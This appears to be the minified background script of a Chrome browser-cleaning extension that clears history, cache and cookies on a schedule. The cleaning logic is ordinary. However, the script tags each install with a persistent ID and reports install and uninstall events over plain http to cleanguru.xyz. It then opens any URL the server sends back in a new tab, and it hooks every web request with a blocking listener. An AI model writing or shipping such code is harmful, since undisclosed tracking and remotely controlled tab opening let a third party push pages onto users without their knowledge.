chrome.runtime.onInstalled.addListener(()=>{const b={autorefresh:!1,floatbtn:!1,shortCuts:!0,cookie_settings:JSON.stringify({inclusive:!0,filters:[]}),dataToRemove:JSON.stringify(["history","cache"]),timePeriod:"last_hour",timeInterval:"off",theme:"light",audio:!0};chrome.storage.local.set(b,()=>{})});class Background{constructor(){this.storage=null,this.actionUrl="http://cleanguru.xyz/api/action/",this.uninstallUrl="http://cleanguru.xyz/uninstall/",this.config={},this.queue=[],this.queueProcessorReady=!1,this.uid="",this.version=chrome.runtime.getManifest().version,this.run()}run(){this.runInstallDeinstallLogic(),this.initStorage().then(()=>{this.checkInterval(),this.initListeners()})}runInstallDeinstallLogic(){this.initInstDeinstStorage(),this.initInstDeinstListeners()}initInstDeinstStorage(){chrome.storage.local.get(b=>{b&&b.config&&(this.config=b.config),this.config.uid?this.uid=this.config.uid:(this.uid=this.config.uid=this.generateUID(),this.saveConfig()),this.queueProcessorReady=!0,this.setUninstallUrl(),this.processQueue()})}setUninstallUrl(){var b="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:"uninstall",uid:this.uid,t:Date.now()})));chrome.runtime.setUninstallURL(this.uninstallUrl+"?"+b)}processQueue(){for(;0<this.queue.length;){var c=this.queue.shift();if(!c.type||"action"!=c.type)return!0;var a="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:c.action,uid:this.uid,t:Date.now()})));fetch(this.actionUrl+"?"+a).then(b=>b.json()).then(function(b){b.url&&chrome.tabs.create({url:b.url})})}}saveConfig(){chrome.storage.local.set({config:this.config})}generateUID(){return"xxxxxxxx-xxxx-2xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(d){var a=0|16*Math.random(),b="x"==d?a:8|3&a;return b.toString(16)})}initInstDeinstListeners(){chrome.runtime.onInstalled.addListener(b=>{this.queue.push({type:"action",action:b.reason}),this.queueProcessorReady&&this.processQueue()})}initStorage(){return new Promise(c=>{chrome.storage.local.get(a=>{this.storage=a,c()})})}checkInterval(){if("chrome_start"===this.storage.timeInterval)return void this.clearData(null,null,!0)}initListeners(){this.initAlarmsListeners(),this.initMessageListeners(),this.initWebrequestListeners()}initAlarmsListeners(){chrome.alarms.onAlarm.addListener(()=>{this.clearData(null,null,!0)})}initMessageListeners(){chrome.runtime.onMessage.addListener((d,a,b)=>{switch(d.action){case"clear":this.clearData(d.tab,d.removeObject),b("");break;case"clearBtn":this.handleClearBtn(),b("");break;case"intervalChange":this.handleIntervalChange(d.value);break;default:}return!0})}initWebrequestListeners(){chrome.webRequest.onHeadersReceived.addListener(({responseHeaders:c})=>{let d=[];return c.forEach(b=>{d.push(b)}),{responseHeaders:d}},{urls:["*://*/*"]},["blocking","responseHeaders"])}clearData(l,a,b){this.getStorageData().then(c=>{const{timePeriod:d,dataToRemove:e,autorefresh:f,cookieFilters:g,shortCuts:h}=c,m=this.getTimeInterval(d),i=a?a:this.getRemoveObject(e);let j=!1;i.cookies&&g.filters.length&&(i.cookies=!1,j=!0),chrome.browsingData.remove({since:m},i),j&&this.accuracyDeleteCookies(g),b||f&&chrome.tabs.reload(l.id,()=>{})}).then(()=>{chrome.tabs.sendMessage(l.id,{data:"startAudio"})})}handleClearBtn(){chrome.tabs.query({active:!0,currentWindow:!0},b=>{this.clearData(b[0])})}handleIntervalChange(c){const d={off:"off",15:15,30:30,60:60,120:120,chrome_start:"chrome_start"}[c];return new Promise((b,a)=>{chrome.storage.local.set({timeInterval:d},()=>{chrome.runtime.lastError&&a(),b()})}).then(()=>this.getInterval("clearInterval")).then(b=>{if(b)this.clearInterval("clearInterval").then(()=>{"off"===d||"chrome_start"===d||this.createInterval("clearInterval",d)});else{if("off"===d||"chrome_start"===d)return;this.createInterval("clearInterval",d)}}).catch(()=>{})}getInterval(c){return new Promise(d=>{chrome.alarms.get(c,b=>{d(b)})})}createInterval(d,a){return new Promise(b=>{chrome.alarms.create(d,{periodInMinutes:a}),b()})}clearInterval(c){return new Promise(a=>{chrome.alarms.clear(c,()=>{a()})})}accuracyDeleteCookies(c){if(c.inclusive)c.filters.forEach(b=>{chrome.cookies.getAll({domain:b},b=>{b.forEach(b=>this.deleteCookie(b))})});else{const d={};c.filters.forEach(b=>{const e=b.split(".");0!==b.indexOf(".")&&0!==b.indexOf("http")&&"localhost"!==b&&(2<e.length||"local"!==e[2])&&(b="."+b),d[b]=!0}),chrome.cookies.getAll({},b=>{b.forEach(b=>{d[b.domain]||this.deleteCookie(b)})})}}deleteCookie(d){const a=d.secure?"https://":"http://",b={url:a+d.domain,name:d.name};chrome.cookies.remove(b,function(){})}getTimeInterval(b){switch(b){case"last_hour":return new Date().getTime()-36e5;case"last_day":return new Date().getTime()-864e5;case"last_week":return new Date().getTime()-6048e5;case"last_month":return new Date().getTime()-24192e5;case"everything":default:return 0;}}getStorageData(){return new Promise(i=>{chrome.storage.local.get(a=>{const b=a.timePeriod,c=a.timeInterval,d=JSON.parse(a.dataToRemove),e=a.autorefresh,f=JSON.parse(a.cookie_settings),g=a.shortCuts;i({timePeriod:b,dataToRemove:d,autorefresh:e,cookieFilters:f,shortCuts:g})})})}getRemoveObject(c){const d={};return c.forEach(b=>d[b]=!0),d}}const guruBackground=new Background;